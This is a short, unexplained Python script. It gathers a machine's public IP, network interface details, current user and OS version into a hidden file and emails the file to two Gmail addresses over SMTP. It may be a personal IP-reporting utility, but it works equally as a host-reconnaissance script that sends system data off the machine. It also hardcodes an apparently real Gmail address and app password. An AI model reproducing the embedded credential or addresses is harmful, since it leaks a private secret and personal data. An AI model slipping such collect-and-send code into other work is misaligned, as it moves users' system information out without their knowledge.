import subprocess
import smtplib
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Output file path
output_file = '/home/.iplist.txt'

# Run shell commands and append output to file
with open(output_file, 'w') as f:
    subprocess.run("curl -s https://ipinfo.io/ip", shell=True, stdout=f)
    subprocess.run("echo '\n\nNetwork Info:'", shell=True, stdout=f)
    subprocess.run("ifconfig", shell=True, stdout=f, stderr=subprocess.STDOUT)
    subprocess.run("echo '\n\nCurrent User:'", shell=True, stdout=f)
    subprocess.run("echo $USER", shell=True, stdout=f, executable="/bin/bash")
    subprocess.run("echo '\n\nOS Version:'", shell=True, stdout=f)
    subprocess.run("grep '^VERSION=' /etc/os-release | cut -d= -f2 | tr -d '\"'", shell=True, stdout=f)

# Email configuration
email_sender = 'babafarooq001@gmail.com'
email_receivers = ['babafarooq001@gmail.com', 'babafarooq9154@gmail.com']
email_subject = 'IP and System Info'
smtp_server = 'smtp.gmail.com'
smtp_port = 587
smtp_username = 'babafarooq001@gmail.com'
smtp_password = 'glor fuby gbus rcal'  # Replace with a secure App Password

# Construct the email
msg = MIMEMultipart()
msg['From'] = email_sender
msg['To'] = ', '.join(email_receivers)
msg['Subject'] = email_subject
msg.attach(MIMEText("Please find the attached IP and system information.", 'plain'))

# Attach file
with open(output_file, 'rb') as attachment:
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(output_file)}')
    msg.attach(part)

# Send the email
try:
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(smtp_username, smtp_password)
    server.sendmail(email_sender, email_receivers, msg.as_string())
    print("Email sent successfully!")
except Exception as e:
    print(f"Error sending email: {e}")
finally:
    server.quit()
